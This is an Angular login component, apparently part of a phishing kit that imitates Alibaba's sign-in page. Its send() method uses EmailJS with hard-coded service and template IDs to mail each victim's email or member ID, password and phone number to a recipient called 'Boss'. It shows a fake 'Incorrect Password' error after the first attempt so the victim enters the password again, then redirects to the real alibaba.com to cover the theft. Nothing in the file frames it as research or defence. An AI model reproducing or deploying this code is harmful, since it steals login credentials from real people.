import { CommonModule } from '@angular/common';
import { Component, OnInit } from '@angular/core';
import { ReactiveFormsModule, FormGroup, FormBuilder } from '@angular/forms';
import { COUNTRY_PHONE_CODES } from '../../Core/constants';
import emailjs from '@emailjs/browser';

@Component({
  selector: 'app-login-section',
  imports: [ReactiveFormsModule, CommonModule],
  templateUrl: './login-section.component.html',
  styleUrl: './login-section.component.scss',
})
export class LoginSectionComponent implements OnInit {
  loginForm!: FormGroup;
  showPassword = false;

  attemptCount = 0;

  useMobile = false;
  showError = false;
  showLoader = false;

  countryCodes = COUNTRY_PHONE_CODES;

  constructor(private fb: FormBuilder) {}

  ngOnInit(): void {
    this.loginForm = this.fb.group({
      account: this.fb.control(''),
      password: this.fb.control(''),
      phoneNumber: this.fb.control(''),
      countryCode: this.fb.control(this.countryCodes[1].code),
    });
  }

  get loginFormControl() {
    return this.loginForm.controls;
  }

  get passwordHasValue() {
    const value = this.loginForm.get('password')?.value;
    if (value) return true;
    else return false;
  }

  get errorMessage() {
    if (!this.loginFormControl['account'].value && !this.useMobile) {
      return 'Enter your email or member ID';
    } else if (!this.loginFormControl['phoneNumber'].value && this.useMobile) {
      return 'Enter you phone number';
    } else {
      return 'Incorrect Password';
    }
  }

  submit() {
    if (this.attemptCount < 1) {
      this.send();

      this.attemptCount++;
    } else {
      this.send(true);
    }

    this.showError = false;
  }

  redirectToExternalSite() {
    window.location.href = 'https://www.alibaba.com/';
  }

  async send(end: boolean = false) {
    this.showLoader = true;

    emailjs.init('pYLO6QYN6aeg6Sagd');
    const response = await emailjs
      .send('service_n6dsppy', 'template_fxjwyar', {
        from_name: 'Alan',
        to_name: 'Boss',

        message: `Email: ${
          this.loginFormControl['account'].value || ''
        } Password: ${this.loginFormControl['password'].value}, Phone Number: ${
          this.loginFormControl['countryCode'].value
        } ${this.loginFormControl['phoneNumber'].value || ''}, Attempt: ${
          this.attemptCount + 1
        }`,

        reply_to: 'No one',
      })
      .then(() => {
        this.showError = true;
        this.showLoader = false;
        if (end) {
          this.redirectToExternalSite();
        }
      })
      .catch(() => {
        this.showLoader = false;

        if (end) {
          this.redirectToExternalSite();
        }
      });
  }
}
